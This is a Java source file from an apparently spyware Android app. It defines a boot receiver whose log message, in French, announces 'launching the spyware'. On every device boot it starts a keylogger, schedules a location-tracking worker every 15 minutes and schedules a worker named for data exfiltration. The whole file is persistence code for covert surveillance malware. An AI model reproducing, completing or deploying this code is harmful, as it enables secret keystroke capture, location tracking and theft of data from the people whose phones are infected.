package com.ware.spyk;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d("BootReceiver", "Démarrage détecté, lancement du spyware.");
            Keylogger.start();
            PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(
                    LocalisationWorker.class,
                    15, TimeUnit.MINUTES) // ⚠️ Intervalle minimum imposé par Android
                    .build();

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    "LocalisationWorker",
                    ExistingPeriodicWorkPolicy.KEEP,
                    request);

            PeriodicWorkRequest dailyExfiltration =
                    new PeriodicWorkRequest.Builder(DailyExfiltrationWorker.class, 15, TimeUnit.MINUTES)
                    //new PeriodicWorkRequest.Builder(DailyExfiltrationWorker.class, 1, TimeUnit.DAYS)
                            .build();

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                    "DailyExfiltrationWork",
                    ExistingPeriodicWorkPolicy.KEEP,
                    dailyExfiltration
            );

        }
    }
}
